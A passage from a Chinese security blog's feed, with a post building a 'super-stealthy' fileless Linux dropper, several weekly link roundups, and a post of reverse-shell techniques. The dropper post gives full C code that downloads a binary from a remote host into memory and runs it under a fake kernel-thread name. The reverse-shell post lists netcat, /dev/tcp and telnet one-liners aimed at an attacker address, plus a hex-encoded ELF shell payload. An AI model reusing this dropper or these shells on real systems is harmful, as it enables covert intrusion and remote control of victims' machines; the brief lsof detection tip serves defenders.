<li>这篇文章我们将要讨论一下怎么利用这两个函数来开发一个超级隐蔽的dropper，你可以认为这是一个恶意软件开发的教程，但是开发和发布恶意软件是违法的：），此文仅做教学使用，因为最终恶意软件分析师需要去了解恶意软件开发者是怎么利用的，好让我们能更好的去检测它，从而使我们的系统更加安全。<h4 id="memfd-create-和-fexecve"><a href="#memfd-create-和-fexecve" class="headerlink" title="memfd_create 和 fexecve"></a>memfd_create 和 fexecve</h4></li>
<li>当读完这句有意思的话之后，我google了这两个函数，我发现功能确实强大，第一个允许我们在内存中创建一个文件，我们之前讨论过这个<a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" target="_blank" rel="external">话题</a>,之前我们是使用/dev/shm来存放的文件，这个文件夹存放在内存中，我们写在这里的东西都不会保存到硬盘上，然而，我们还是可以通过ls看到它。</li>
<li>memfd_create 能做同样的事情，但是它在内存中的存储并不会被映射到文件系统中，因此不能简单的通过ls命令进行查看。</li>
<li>第二个函数，fexecve同样的功能很强大，它能使我们执行一个程序（同execve），但是传递给这个函数的是文件描述符，而不是文件的绝对路径，也就是说搭配起来memfd_create使用简直完美！</li>
<li>但是这里有一个需要注意的地方就是，因为这两个函数相对的比较新，memfd_create 是在kernel3.17才被引进来，fexecve是libc的一个函数，是在版本2.3.2之后才有的，当然没有fexecve的时候，我们也可以使用其它方式去取代它（后面会讨论），而memfd_create只能用在相对较新的linux内核系统上。</li>
<li>这意味着至少在现在，这个技巧在一些运行着老内核和没有libc的嵌入式设备上是不可行的，我没有测试一些路由器和安卓设备上是否存在fexecve函数，我觉得是没有的，如有人知道，请在评论处告知；）<h4 id="一个简单的dropper"><a href="#一个简单的dropper" class="headerlink" title="一个简单的dropper"></a>一个简单的dropper</h4></li>
<li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存储在磁盘上。</li>
<li>在这之前，我们先来看看之前文章中讨论过的<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" target="_blank" rel="external">Hajime</a>这个例子,这个例子使用了一行shell命令来创建一个文件（‘继承‘了另外一个文件的可执行权限）并且执行它然后再删除它。如果你不想打开链接，我之前把这行shell搬过来<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI</div></pre></td></tr></table></figure>
</li>
</ul>
<p>我们将要创建一个新的.s,一旦执行，将会达到执行类型上面一行shell同样的效果。</p>
<ul>
<li><p>让我们先来看一下这个代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/syscall.h&gt;</div><div class="line"></div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">#define __NR_memfd_create 319</div><div class="line">#define MFD_CLOEXEC 1</div><div class="line"></div><div class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</div><div class="line">    return syscall(__NR_memfd_create, name, flags);</div><div class="line">&#125;</div><div class="line"></div><div class="line">extern char        **environ;</div><div class="line"></div><div class="line">int main (int argc, char **argv) &#123;</div><div class="line">  int                fd, s;</div><div class="line">  unsigned long      addr = 0x0100007f11110002;</div><div class="line">  char               *args[2]= &#123;&quot;[kworker/u!0]&quot;, NULL&#125;;</div><div class="line">  char               buf[1024];</div><div class="line"></div><div class="line">  // Connect</div><div class="line">  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);</div><div class="line">  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);</div><div class="line">  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  while (1) &#123;</div><div class="line">      if ((read (s, buf, 1024) ) &lt;= 0) break;</div><div class="line">      write (fd, buf, 1024);</div><div class="line">    &#125;</div><div class="line">  close (s);</div><div class="line">  </div><div class="line">  if (fexecve (fd, args, environ) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  return 0;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>代码很短也很简单，但是这里有几个点需要稍微介绍一下。</p>
<h4 id="调用memfd-create"><a href="#调用memfd-create" class="headerlink" title="调用memfd_create"></a>调用memfd_create</h4></li>
<li>第一个要介绍的就是，libc并没有对memfd_create这个系统调用进行封装（你可以在这里看到这个系统调用的相关信息<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" target="_blank" rel="external">memfd_create manpage’s NOTES section</a>）,这就意味着我们需要自己去封装一下。</li>
<li>首先我们需要找到memfd_create在系统调用中的索引，通过一些在线的系统调用表，这个索引在不同的架构下是不同的，如果你想将上面的代码应用在ARM和MIPS上,可能需要不同的索引，在X86_64系统架构下的索引是319.</li>
<li>我使用了libc的syscall去对memfd_create进行了封装。</li>
<li>这个程序主要做了下面的事情</li>
<li>1.创建了一个TCP socket</li>
<li><p>2，使用AF_INET连接了127.0.0.1的0x1111端口，我们可以把这些所有的打包到一个变量里面这样可以使我们的代码看起来更短一点儿，同样你也可以去修改成你想要的ip和端口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">addr = 01 00 00  7f   1111  0002;</div><div class="line">        1. 0. 0.127   1111  0002;</div><div class="line">       +------------+------+----</div><div class="line">         IP Address | Port | Family</div></pre></td></tr></table></figure>
</li>
<li><p>3.创建一个内存文件</p>
</li>
<li>4.从socket读取数据写入到内存文件</li>
<li>5.一旦文件传输完毕，运行内存文件</li>
<li>是不是很简单粗暴；）<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4></li>
<li>现在，让我们来测试一下，通过main函数里面那个long的变量我们知道，这个dropper将会去连接本地localhost(127.0.0.1)的0x1111端口，这里我们简单的使用nc模拟一个server。</li>
<li><p>在控制台我们运行下面的命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cat /usr/bin/xeyes | nc -l $((0x1111))</div></pre></td></tr></table></figure>
</li>
<li><p>你可以选择任意你喜欢的二进制文件，我这里用的是xeyes（一个小眼睛会跟踪鼠标的移动）这个linux自带的小程序。在另外的一个命令行界面我们运行我们的dropper，这个时候xeyes会弹出来。<br><img src="/2018/02/20/linux一种无文件后门技巧/xeye.png" alt=""></p>
<h4 id="检测这个dropper"><a href="#检测这个dropper" class="headerlink" title="检测这个dropper"></a>检测这个dropper</h4></li>
<li><p>查找这个进程比较困难，因为我们给这个进程起了一个kworker/u!0这样的名字，注意！在这里只是为了快速的去发现它，当然在实际情况中，你可以使用一个具有迷惑性的名字，比如说什么so的进程名来让它看起来像是个内核的合法进程，让我们来看一下ps的输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ ps axe</div><div class="line">(...)</div><div class="line"> 2126 ?        S      0:00 [kworker/0:0]</div><div class="line"> 2214 pts/0    S+     0:00 [kworker/u!0]</div><div class="line">(...)</div></pre></td></tr></table></figure>
</li>
<li><p>你可以看到上面的一行中是一个合法的kworker进程，下面的就是我们的看似合法的进程。</p>
<h4 id="看不见的文件"><a href="#看不见的文件" class="headerlink" title="看不见的文件"></a>看不见的文件</h4></li>
<li>我们之前提到的memfd_create 将会在RAM文件系统中创建文件且不会映射到一般的文件系统，至少，如果映射了，我是没找到，所以现在看来这的确是相当隐蔽的。</li>
<li>然而，事实上，如果一个文件存在，那么我们还是可以去发现它的，谁会去调用这个文件呢，没错，我们可以通过lsof(list of file)去查找：）到它<br><img src="/2018/02/20/linux一种无文件后门技巧/lsof.png" alt=""></li>
<li>注意lsof同样可以会显示出进程id，所以我们之前用的伪装的进程名在这个时候也就没有用了。<h4 id="如果系统中没有memfd-open不存在呢"><a href="#如果系统中没有memfd-open不存在呢" class="headerlink" title="如果系统中没有memfd_open不存在呢"></a>如果系统中没有memfd_open不存在呢</h4></li>
<li>我之前提到过memfd_open只是存在于内核在3.17或者更高的版本中，那在其它的版本中该怎么办，这种情况下我们可以使用另外一种没那么猥琐但是可以达到同样效果的方法。</li>
<li>我们最好的方式是使用shm_open(shared memory open)，这个函数会在/dev/shm文件夹下创建文件，然而，这个使用ls命令是可以看的到的，但是至少还是避免了写文件到磁盘了，shm_open和open的区别仅仅是不是在/dev/shm创建文件。</li>
<li>使用shm_open去修改这个dropper我们需要去做两件事情</li>
<li><p>1.首先我们需要去使用shm_open去代替memfd_create像是这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">if ((fd = shm_open(&quot;a&quot;, O_RDWR | O_CREAT, S_IRWXU)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
</li>
<li><p>2.第二件事情就是我们需要关闭这个文件，然后去重新打开是为了能够通过fexecve去执行它，所以在while接收完文件之后我们需要关闭文件，然后重启新开文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">  close (fd);</div><div class="line"></div><div class="line">  if ((fd = shm_open(&quot;a&quot;, O_RDONLY, 0)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
</li>
<li><p>然而，主要注意的是，这个时候我们完全可以使用execve去替代fexecve去达到同样的效果。</p>
<h4 id="那如果fexecve不存在呢"><a href="#那如果fexecve不存在呢" class="headerlink" title="那如果fexecve不存在呢"></a>那如果fexecve不存在呢</h4></li>
<li><p>当你知道fexecve是怎么工作的，这个就很简单，怎么去知道这个函数是怎么工作的，google一下看看源代码，man page有一个提示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NOTES</div><div class="line">On Linux, fexecve() is implemented using the proc(5) file system, so /proc needs to be mounted and available at the time of the call.</div></pre></td></tr></table></figure>
</li>
<li><p>所以fexecve需要系统存在/proc的目录。让我们看看能不能自己实现一下。我们知道每个进程在虚拟目录proc下都有一个数字文件目录与之相对，所以这个时候，我们可以基本上使用下面的封装函数来实现fexecve的功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int</div><div class="line">my_fexecve (int fd, char **arg, char **env) &#123;</div><div class="line">  char  fname[1024];</div><div class="line"></div><div class="line">  snprintf (fname, 1024, &quot;/proc/%d/fd/%d&quot;, getpid(), fd);</div><div class="line">  execve (fname, arg, env);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
<li>读完这篇文章，你应该了解了之前提到的open/memfdcreate/sendfile/fexecve这几个函数。</li>
<li>这篇文章中作者是以打开xeye程序为示例，还有其它猥琐的利用场景吗？<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li><a href="https://0x00sec.org/t/super-stealthy-droppers/3715" target="_blank" rel="external">Super-Stealthy Droppers</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;几周之前我看了这篇&lt;a href=&quot;https://blog.gdssecurity.com/la
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180214安全动态</title>
    <link href="http://kevien.github.io/2018/02/14/20180214%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/02/14/20180214安全动态/</id>
    <published>2018-02-14T04:21:49.000Z</published>
    <updated>2018-02-14T08:52:09.823Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>Docker 微服务教程<br><a href="http://www.ruanyifeng.com/blog/2018/02/docker-wordpress-tutorial.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2018/02/docker-wordpress-tutorial.html</a></li>
<li>渗透技巧——Windows下的剪贴板<br><a href="http://www.4hou.com/technology/10253.html" target="_blank" rel="external">http://www.4hou.com/technology/10253.html</a></li>
<li>HTA encryption tool for RedTeams<br><a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/" target="_blank" rel="external">https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/</a></li>
<li>Stealing SSH credentials via a Python PAM module<br><a href="https://github.com/mthbernardes/sshLooter" target="_blank" rel="external">https://github.com/mthbernardes/sshLooter</a></li>
<li>关于浏览器安全的会议ppt<br><a href="https://www.kanxue.com/book-9-208.htm" target="_blank" rel="external">https://www.kanxue.com/book-9-208.htm</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Docker 微服务教程&lt;br&gt;&lt;a href=&quot;http://www.ruanyifeng.c
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180206安全动态</title>
    <link href="http://kevien.github.io/2018/02/06/20180206%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/02/06/20180206安全动态/</id>
    <published>2018-02-05T16:01:38.000Z</published>
    <updated>2018-02-09T16:04:49.089Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>APTSimulator - 一个批处理脚本，快速将 Windows 系统改造成被 APT 入侵过的环境，用于安全产品测试等需求<br><a href="https://github.com/Neo23x0/APTSimulator" target="_blank" rel="external">https://github.com/Neo23x0/APTSimulator</a></li>
<li>Sickle - shellcode 辅助开发工具<br><a href="https://github.com/wetw0rk/Sickle" target="_blank" rel="external">https://github.com/wetw0rk/Sickle</a></li>
<li>Evilgrade - 专门用来攻击常用软件更新的框架，劫持常用软件的更新信道，替换为指定的二进制文件<br><a href="https://github.com/infobyte/evilgrade" target="_blank" rel="external">https://github.com/infobyte/evilgrade</a></li>
<li>IDA Pro 的官方推出了 7.0 的免费版本，支持 Windows、macOS、Linux 三个平台<br><a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml" target="_blank" rel="external">https://www.hex-rays.com/products/ida/support/download_freeware.shtml</a></li>
<li>ToolAnalysisResultSheet - 日本 CERT（jpcert）总结的 49 个常用工具（PsExec、wmic、schtasks、PWDump7 等）在执行后会留下的系统痕迹，这些记录可以被用于判断机器是否被入侵过<br><a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/" target="_blank" rel="external">https://jpcertcc.github.io/ToolAnalysisResultSheet/</a></li>
<li>在 XML 中使用两种编码以绕过 WAF 检测<br><a href="https://mohemiv.com/all/evil-xml/" target="_blank" rel="external">https://mohemiv.com/all/evil-xml/</a></li>
<li>二进制漏洞利用开发教程<br><a href="https://0x00sec.org/t/getting-cozy-with-exploit-development/5311" target="_blank" rel="external">https://0x00sec.org/t/getting-cozy-with-exploit-development/5311</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;APTSimulator - 一个批处理脚本，快速将 Windows 系统改造成被 APT 入侵
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>reverse shell的几种方式</title>
    <link href="http://kevien.github.io/2018/01/30/reverse-shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <id>http://kevien.github.io/2018/01/30/reverse-shell的几种方式/</id>
    <published>2018-01-30T07:58:01.000Z</published>
    <updated>2018-02-04T10:27:43.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
<li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。</li>
<li>linux(GNUx)有很多的发行版，不同的发现版之前的内置工具、安全机制等都有所不同。</li>
<li>下文中的几个例子一般在大多数的系统中是通用的。</li>
<li>这里主要重点关注一下4和5<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4></li>
<li>要求能够使用者能够在目标机器上运行一些基本的命令。<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
<li>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T</div><div class="line">nc -n -vv -l -p &lt;port&gt;					# A</div></pre></td></tr></table></figure>
<ul>
<li>现在的netcat版本可能没有-e参数。<h2 id="2-netcat-e被禁用或者没有-e参数"><a href="#2-netcat-e被禁用或者没有-e参数" class="headerlink" title="2.netcat -e被禁用或者没有-e参数"></a>2.netcat -e被禁用或者没有-e参数</h2></li>
<li>那么可以使用下面的命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt;	# A</div></pre></td></tr></table></figure>
<p><img src="/2018/01/30/reverse-shell的几种方式/2.png" alt=""></p>
<h2 id="3-不使用netcat"><a href="#3-不使用netcat" class="headerlink" title="3.不使用netcat"></a>3.不使用netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1      # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
<ul>
<li>这个也是大多数人用的方式，这种方式使用了/dev/tcp套接字的编程特性，重定向/bin/bash到远程系统<h2 id="4-不使用netcat和-dev-tcp"><a href="#4-不使用netcat和-dev-tcp" class="headerlink" title="4.不使用netcat和/dev/tcp"></a>4.不使用netcat和/dev/tcp</h2></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p &amp;&amp; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe	    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
<p><img src="/2018/01/30/reverse-shell的几种方式/4.png" alt=""></p>
<ul>
<li>使用telnet代替nc<h2 id="5-telnet-to-telnet"><a href="#5-telnet-to-telnet" class="headerlink" title="5.telnet to telnet"></a>5.telnet to telnet</h2></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</div><div class="line">nc -n -vv -l -p &lt;1st_port&gt; 	# A1</div><div class="line">nc -n -vv -l -p &lt;2nd_port&gt;	# A2</div></pre></td></tr></table></figure>
<p><img src="/2018/01/30/reverse-shell的几种方式/5.png" alt=""></p>
<ul>
<li>这第五个其实挺有意思的。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-机器码"><a href="#6-机器码" class="headerlink" title="6.机器码"></a>6.机器码</h2></li>
<li>这里的shellcode可以使用msf生成<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -v -l 1337             # Attacker</div><div class="line">echo -e &quot;\x7F\x45\x4C\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x60\x80\x04\x08\x34\x00\x00\x00\xBC\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00\x03\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xAA\x00\x00\x00\xAA\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6A\x66\x58\x6A\x01\x5B\x31\xD2\x52\x53\x6A\x02\x89\xE1\xCD\x80\x92\xB0\x66\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xE1\x6A\x10\x51\x52\x89\xE1\x43\xCD\x80\x6A\x02\x59\x87\xDA\xB0\x3F\xCD\x80\x49\x79\xF9\xB0\x0B\x41\x89\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80\x00\x2E\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2E\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x60\x80\x04\x08\x60\x00\x00\x00\x4A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&quot; &gt; c; chmod +x c;./c &amp; rm c  # Target</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
<li>这里只是一些小技巧，我希望在我们遇到比如某些命令在某个系统中不能使用的时候，或许我们可以发现并使用其它的方式，可以达到同样的效果，而不是在一棵树上吊死<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4></li>
<li><a href="https://0x00sec.org/t/spawning-reverse-shells/2133" target="_blank" rel="external">Spawning reverse shells</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。&lt;/li&gt;
&lt;li&gt;linux(GNUx
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180129安全动态</title>
    <link href="http://kevien.github.io/2018/01/29/20180129%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/01/29/20180129安全动态/</id>
    <published>2018-01-29T04:52:57.000Z</published>
    <updated>2018-02-01T10:24:35.232Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>Linux boot process 分析<br><a href="https://opensource.com/article/18/1/analyzing-linux-boot-process" target="_blank" rel="external">https://opensource.com/article/18/1/analyzing-linux-boot-process</a></li>
<li>使用 RADARE 进行逆向工程之基础入门<br><a href="https://pixl.dy.fi/posts/2018-01-22-reverse-engineering-basics-with-radare-fundamentals-and-basics/" target="_blank" rel="external">https://pixl.dy.fi/posts/2018-01-22-reverse-engineering-basics-with-radare-fundamentals-and-basics/</a></li>
<li>dnscrypt-proxy - 一款 DNS 代理，支持加密的 DNS 协议<br><a href="https://github.com/jedisct1/dnscrypt-proxy" target="_blank" rel="external">https://github.com/jedisct1/dnscrypt-proxy</a></li>
<li>命令行下的“蒙面歌王”rundll32.exe<br><a href="http://www.freebuf.com/sectool/160696.html" target="_blank" rel="external">http://www.freebuf.com/sectool/160696.html</a></li>
<li>如何做好首席安全官 – 企业安全体系与架构实现<br><a href="https://www.sec-un.org/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E9%A6%96%E5%B8%AD%E5%AE%89%E5%85%A8%E5%AE%98-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E6%9E%B6%E6%9E%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="external">https://www.sec-un.org/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E9%A6%96%E5%B8%AD%E5%AE%89%E5%85%A8%E5%AE%98-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E6%9E%B6%E6%9E%84%E5%AE%9E%E7%8E%B0/</a></li>
<li>Cisco ASA 实验环境的搭建，来自 NCC Group<br><a href="https://github.com/nccgroup/asatools/blob/master/tutorial.md" target="_blank" rel="external">https://github.com/nccgroup/asatools/blob/master/tutorial.md</a></li>
<li>IoT ARM 漏洞利用开发介绍<br><a href="https://www.exploit-db.com/docs/english/43906-arm-exploitation-for-iot.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/english/43906-arm-exploitation-for-iot.pdf</a></li>
<li>wavecrack - 调用 Hashcat 进行密码破解的 Web 操作接口<br><a href="https://github.com/wavestone-cdt/wavecrack" target="_blank" rel="external">https://github.com/wavestone-cdt/wavecrack</a></li>
<li>Metasploit 框架新集成了 MS17-010 EternalSynergy Exploits，该 Exploits 支持 Windows 2000 到 Windows Server 2016 的所有版本，非常稳定<br><a href="https://github.com/rapid7/metasploit-framework/pull/9473" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/pull/9473</a></li>
<li>DCShadow - Active Directory 域控环境中的最新攻击方法<br><a href="https://blog.alsid.eu/dcshadow-explained-4510f52fc19d" target="_blank" rel="external">https://blog.alsid.eu/dcshadow-explained-4510f52fc19d</a></li>
<li>CloudFlair - 使用来自 Censys 的互联网扫描数据查找使用 CloudFlare 的网站的原始服务器的工具<br><a href="https://github.com/christophetd/CloudFlair" target="_blank" rel="external">https://github.com/christophetd/CloudFlair</a></li>
<li>lanGhost - 可通过 Telegram 控制的局域网后门<br><a href="https://github.com/xdavidhu/lanGhost" target="_blank" rel="external">https://github.com/xdavidhu/lanGhost</a></li>
<li>恐怖的 IoT 收割机 - Botnets 服务中的漏洞<br><a href="https://embedi.com/blog/grim-iot-reaper-1-and-0-day-vulnerabilities-at-the-service-of-botnets/" target="_blank" rel="external">https://embedi.com/blog/grim-iot-reaper-1-and-0-day-vulnerabilities-at-the-service-of-botnets/</a></li>
<li>prospector - 类似 Pylint 的 Python 代码分析工具<br><a href="https://github.com/landscapeio/prospector" target="_blank" rel="external">https://github.com/landscapeio/prospector</a></li>
<li>PHP源码调试之WINDOWS文件通配符分析<br><a href="http://avfisher.win/archives/888" target="_blank" rel="external">http://avfisher.win/archives/888</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Linux boot process 分析&lt;br&gt;&lt;a href=&quot;https://openso
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux进程注入(-)</title>
